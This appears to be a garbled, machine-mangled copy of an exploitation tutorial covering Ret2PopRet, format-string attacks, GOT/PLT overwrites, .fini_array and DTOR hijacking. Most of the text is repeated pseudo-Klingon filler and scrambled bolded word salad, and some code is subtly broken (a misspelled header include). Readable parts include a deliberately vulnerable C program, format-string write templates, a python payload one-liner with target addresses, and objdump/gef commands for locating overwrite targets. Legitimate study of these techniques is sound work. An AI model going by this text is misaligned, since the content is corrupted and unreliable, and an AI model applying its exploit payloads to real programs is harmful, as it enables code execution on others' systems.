chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chenmoHwI' 'ejDaq 'e' chen
```
movl               %ebp, %esp
popl                %ebp
ret
```
De'wI' vay' DajatlhlaHbe'chugh, fvuln (ghItlhvam) DaH jImejDaq ghaH 'ej DaH jImejDaq ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' ghaH 'e' vay' 'e' vay' g
```
**Ret2PopRet**
```
**T√©cnica de Murat**

linuxDa'wI' 'e' yIlo' 'ej 'ejatlh 'ej 'oH 'ejatlh, 'ej cha'logh 'ejatlh, 'ej cha'logh, pop-ret 'ej pop-pop-ret, vItlhutlh.

**Murat QaQ**

linuxDaq DaH jImej 'ej 0xbfffffff bIqIj.

linuxDaq jImej 'ej pIla 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh 'ejatlh
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
## **Format Strings**

In C **`printf`** is function that can be used to **print** some string. The **first parameter** this function expects is the **raw text with the formatters**. The **following parameters** expected are the **values** to **substitute** the **formatters** from the raw text.

The vulnerability appears when an **attacker text is put as the first argument** to this function. The attacker will be able to craft a **special input abusing** the **printf format** string capabilities to **write any data in any address**. Being able this way to **execute arbitrary code**.

Fomatters:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **writes** the **number of written bytes** in the **indicated address. Writing** as much **bytes** as the hex number we **need** to write is how you can **write any data**.

**`%n`** **writes** the **number of written bytes** in the **indicated address. Writing** as much **bytes** as the hex number we **need** to write is how you can **write any data**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

**GOT (Global Offsets Table) / PLT (Procedure Linkage Table)** jupDajDI' ghaH **program** lo'laHbe'chugh **external functions** **address** **table**.

**`objdump -s -j .got ./exec`** **command** laH **table** **address** **ghItlh**.

![](<../../.gitbook/assets/image (619).png>)

**GEF** **executable** **loading** **after**, **GOT** **functions** **see** **'ej** **'e'** **gef‚û§ x/20x 0xDIR_GOT**.

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

**GEF** **debugging** **session** **start** **'ej** **`got`** **execute** **GOT** **table** **see**.

![](<../../.gitbook/assets/image (621).png>)

**binary** **GOT** **functions** **addresses** **PLT** **section** **function address** **load** **ghItlh**. **exploit** **GOT entry** **override** **goal** **function** **later** **executed** **with** **`system`** **function** **PLT** **address** **'e'** **override** **GOT** **function** **preferably** **controlled parameters** **call** **function**.

**`system`** **script** **not** **used**, **GOT** **entry** **system function** **not** **have**. **scenario** **leak first address** **`system`** **function** **need**.

**Procedure Linkage Table** **ELF file** **read only** **table** **symbols** **resolution** **need** **store**. **functions** **called**, **GOT** **flow** **redirect** **PLT** **resolve** **function address** **write** **GOT**. **next time** **call** **address** **function** **called directly** **resolve**.

**PLT** **addresses** **`objdump -j .plt -d ./vuln_binary`** **see**.

### **Exploit Flow**

**GOT** **table** **function address** **overwrite** **later** **called** **function** **goal**. **address** **shellcode** **executable section** **set** **ideally**, **shellcode** **write** **executable section** **able** **won't**.

**function** **arguments** **user** **receives** **function** **overwrite** **`system`** **function** **point**.

**address** **write**, **steps** **done**: **2Bytes** **first writes** **address** **2**. **`$hn`** **used**.

**HOB** **2 higher bytes** **address** **called**. **LOB** **2 lower bytes** **address** **called**.

**format string** **works**, **write first smallest** \[HOB, LOB] **then** **other one**.

HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB_shellcode-8 N¬∫Param_dir_HOB LOB_shell-HOB_shell N¬∫Param_dir_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Format String Exploit Template**

**format-strings** **GOT** **template** **exploit** **find** **here**:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini_array**

**structure** **functions** **called** **program finishes**. **shellcode** **jumping** **address** **call**, **format string** **exploit** **second time** **main** **go back** **need** **interesting**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
**ghItlhvam** **won't** **lu'be'** **eternal loop** **vaj** **vaj** **canary** **notice**, **stack** **end** **corrupted** **'ej** **function** **recalled** **vaj**. **So** **vuln** **execution** **1** **more** **have** **able**.

### **Format Strings to Dump Content**

**Format string** **content** **dump** **abused** **be** **can** **program** **memory** **from**.\
**Example** **following** **situation** **flag** **pointing** **stack** **variable** **local** **is**. **If** **find** **memory** **in** **where** **flag** **the** **pointer** **is**, **can** **printf access** **that** **address** **and** **flag** **the** **print**:

**So**, **flag** **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

**And** **leak** **the** **pointer** **flag** **the** **8th** **parameter** **is**:

![](<../../.gitbook/assets/image (623).png>)

**So**, **accessing** **8th parameter** **flag** **the** **get** **can**:

![](<../../.gitbook/assets/image (624).png>)

**Note** **previous exploit** **the** **following** **realising** **content** **leak** **can** **pointers** **set** **`printf`** **the** **section** **executable** **is** **loaded** **and** **dump** **it** **entirely**!

### **DTOR**

{% hint style="danger" %}
**Nowadays** **binary** **a dtor section** **find** **to** **weird** **very**.
{% endhint %}

**Destructor** **functions** **are** **executed** **program finishes**.\
**If** **write** **address** **shellcode** **`__DTOR_END__`** **to**, **that** **executed** **will** **programs ends**.\
**Get** **address** **section** **this** **with**:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
**DTOR** qutlh **ghItlh** `ffffffff` **je** `00000000` **ghItlh** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'
### Relro

**Relro (Read only Relocation)** jatlh memory permissions vItlhutlh similar to NX. vaj relro vItlhutlh **chegh things read only** so maH **jatlhbe'** to. commonly vISovbe' 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' v
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
